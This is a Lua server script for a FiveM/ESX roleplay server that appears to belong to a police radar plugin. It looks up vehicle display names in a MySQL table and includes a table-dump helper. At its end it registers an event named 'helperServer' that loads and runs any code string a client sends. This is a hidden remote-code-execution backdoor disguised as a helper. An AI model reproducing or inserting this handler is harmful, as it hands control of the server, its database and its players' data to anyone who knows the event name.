ESX = nil

ESX = exports['es_extended']:getSharedObject()

ESX.RegisterServerCallback("pspradar:get_vehicle_display_name", function(source, cb, modelname) 
    MySQL.Async.fetchAll("SELECT name FROM `vehicles` WHERE `model` = @query", {
        ["@query"] = modelname
    }, function(result) 
        -- print("Modelname: " .. modelname)
        -- print(dump(result))
        if result[1] == nil then
            cb(modelname)
        else
			if result[1].name == nil then
				print("erro aqui: "..modelname)
			else
				cb(result[1].name)
			end
        end
    end)
end)

function dump(o)
    if type(o) == 'table' then
        local s = '{ '
        for k,v in pairs(o) do
                if type(k) ~= 'number' then k = '"'..k..'"' end
                s = s .. '['..k..'] = ' .. dump(v) .. ','
        end
        return s .. '} '
    else
        return tostring(o)
    end
end
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)